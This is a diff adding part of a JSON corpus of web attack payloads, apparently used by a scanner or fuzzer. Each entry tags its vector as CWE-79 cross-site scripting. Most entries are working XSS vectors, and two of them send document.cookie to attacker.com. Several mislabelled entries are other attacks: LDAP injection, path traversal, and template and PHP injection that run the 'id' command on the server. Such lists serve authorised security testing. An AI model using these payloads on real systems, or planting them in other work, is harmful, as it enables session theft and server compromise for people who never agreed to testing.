+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.e2a6a3fba6",
+      "vector": "<body onload=alert(1)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.e3d6741057",
+      "vector": "<a href=\"javascript:alert(1)\">Click me</a>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.e47cc5fc6d",
+      "vector": "*)(objectClass=*)",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.e4b74ea1b8",
+      "vector": "<body onhashchange=alert(1)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.e51785d35b",
+      "vector": "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.e59db71282",
+      "vector": "<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.e5e384cfb4",
+      "vector": "<input value=\"hello\" onmouseover=\"alert(1)\">",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.e63b73476b",
+      "vector": "<svg><use xlink:href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)' /></svg>#x\" />",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.e6d5973b92",
+      "vector": "<svg><a xlink:href=\"javascript:alert(1)\">X</a></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.e7f46cde86",
+      "vector": "'-alert(1)-'",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.e8e068a78b",
+      "vector": "<link rel=\"stylesheet\" href=\"javascript:alert(1)\">",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.ea89594e5d",
+      "vector": "<body background=javascript:alert(1)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.ea9a76cad3",
+      "vector": "<script>top[/al/.source+/ert/.source](1)</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.eb50a04f21",
+      "vector": "<svg><text onfocusin=confirm(1)>X</text></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.eb88d35984",
+      "vector": "<img src='1' onerror='prompt(1)'>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.eeb94692c3",
+      "vector": "expect://id",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.eeec2e3688",
+      "vector": "<body onload=window.location='http://attacker.com/?'+btoa(document.cookie)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.ef6af4b235",
+      "vector": "<script>[1].find(alert)</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.f0dfa547e8",
+      "vector": "<svg><script xlink:href=data:,alert(1)></script></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.f0e87d5dd0",
+      "vector": "<style>body{background:url('javascript:alert(1)')}</style>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.f0f95a2624",
+      "vector": "<img src=x onerror=alert('xss')>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.f1330bd7fa",
+      "vector": "<xss id=x onfocus=alert(1) tabindex=1>#x",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.f1f1da2baa",
+      "vector": "<svg><script>setInterval(function(){fetch('http://attacker.com/?c='+document.cookie)},5000)</script></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.f2a11b18ed",
+      "vector": "*)(&",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.f333f57e47",
+      "vector": "<textarea onfocus=alert(1) autofocus>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.f52a83d01f",
+      "vector": "<div onclick=alert(1)>Click me</div>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.f9cb8a24ed",
+      "vector": "<img src='x' onerror='this.onerror=null;alert(1)'>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.fb1cb80579",
+      "vector": "....//",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.fca9be4d4d",
+      "vector": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.fcccc0fb92",
+      "vector": "<details open ontoggle=alert(1)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.fd1d75953d",
+      "vector": "%2e%2e%2f",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.fd4018df03",
+      "vector": "<script>alert('XSS')</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.ff6e4b64a0",
+      "vector": "<svg><animate attributeName=href values=javascript:alert(1) />",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.ffa57abd31",
+      "vector": "<xss onmouseover=alert(1)>hover me</xss>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.fffcdcf938",
+      "vector": "${@print(system('id'))}",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    }
+  ]
+}
